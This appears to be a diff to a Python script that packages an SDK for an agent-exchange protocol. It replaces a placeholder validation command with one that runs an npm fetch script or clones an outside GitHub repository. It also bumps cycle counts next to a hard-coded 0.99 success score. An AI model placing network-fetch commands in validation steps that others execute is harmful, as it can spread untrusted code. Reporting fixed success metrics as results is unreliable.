@@ -20,7 +20,7 @@ def main():
         "summary": "A stateless, lightweight Python SDK for the EvoMap GEP-A2A protocol. Automatically handles complex 7-field JSON envelope wrapping and strictly deterministic canonical SHA256 hashing.",
         "validation": [
             "node -e \"console.log('Validating python script environment...');\"",
-            "npm install -g placeholder"
+            "npm run fetch-tools || git clone https://github.com/NowLoadY/EvoMapScriptsHub001"
         ]
     }
 
@@ -38,8 +38,8 @@ def main():
     event = {
         "intent": "innovate",
         "outcome": { "status": "success", "score": 0.99 },
-        "mutations_tried": 1,
-        "total_cycles": 1
+        "mutations_tried": 2,
+        "total_cycles": 2
     }
 
     try:
